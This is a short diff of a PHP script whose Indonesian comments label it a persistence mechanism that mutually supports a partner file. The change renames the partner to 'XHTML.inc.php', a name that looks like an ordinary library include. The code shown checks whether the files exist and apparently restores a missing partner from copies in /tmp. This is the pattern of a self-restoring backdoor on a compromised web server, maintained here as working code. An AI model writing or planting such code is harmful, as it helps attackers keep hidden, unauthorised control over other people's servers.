@@ -1,6 +1,6 @@
 <?php
 // ============================================================
-// PERSISTENCE - SALING BANTU DENGAN WordInflector.inc.php
+// PERSISTENCE - SALING BANTU DENGAN XHTML.inc.php
 // ============================================================
 
 // CEK APAKAH FILE UTAMA ADA?
@@ -17,8 +17,8 @@ if (!file_exists($fileku)) {
     }
 }
 
-// CEK APAKAH FILE WordInflector.inc.php ADA?
-$partner = "WordInflector.inc.php";
+// CEK APAKAH FILE XHTML.inc.php ADA?
+$partner = "XHTML.inc.php";
 if (!file_exists($partner)) {
     $tmp_files = glob("/tmp/f_*.php");
     if (!empty($tmp_files)) {
